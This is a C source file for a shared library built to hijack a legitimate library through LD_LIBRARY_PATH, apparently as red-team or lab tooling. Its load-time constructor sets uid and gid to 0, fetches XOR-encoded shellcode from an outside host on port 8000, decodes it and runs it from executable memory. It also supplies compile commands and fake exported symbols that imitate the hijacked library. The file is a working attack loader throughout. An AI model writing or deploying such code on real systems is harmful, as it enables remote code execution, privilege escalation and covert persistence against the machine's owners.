#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <curl/curl.h>

// Compile as follows:
// gcc -Wall -fPIC -z execstack -c -o xorLdLibraryPath.o xorLdLibraryPath.c
// gcc -shared -o xorLdLibraryPath.so xorLdLibraryPath.o -ldl

#define SHELLCODE_URL "http://192.168.235.130:8000/beacons/agent.xor.bin"
#define XOR_KEY       "vns69"

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
// Output of: readelf -s --wide <hijacked lib> | grep FUNC | awk '{print $8}'
int gpgrt_poll;

// --- curl download struct ---
struct MemoryStruct {
    unsigned char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    unsigned char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) return 0;

    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

void runmahpayload() {
    setuid(0);
    setgid(0);
    printf("Starting library hijacking!\n");

    // --- Fetch XOR-encoded shellcode from URL ---
    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_global_init(CURL_GLOBAL_ALL);
    CURL *curl = curl_easy_init();
    if (!curl) return;

    curl_easy_setopt(curl, CURLOPT_URL, SHELLCODE_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    if (res != CURLE_OK) return;

    // --- XOR decode in-place ---
    int key_len = strlen(XOR_KEY);
    for (size_t i = 0; i < chunk.size; i++) {
        chunk.memory[i] ^= XOR_KEY[i % key_len];
    }

    // --- Allocate RWX memory and copy decoded shellcode ---
    void *exec_mem = mmap(
        NULL,
        chunk.size,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_ANON | MAP_PRIVATE,
        -1,
        0
    );

    if (exec_mem == MAP_FAILED) {
        free(chunk.memory);
        return;
    }

    memcpy(exec_mem, chunk.memory, chunk.size);
    free(chunk.memory);

    // --- Execute ---
    ((void(*)())exec_mem)();

    munmap(exec_mem, chunk.size);
    printf("Library hijacked!\n");
}
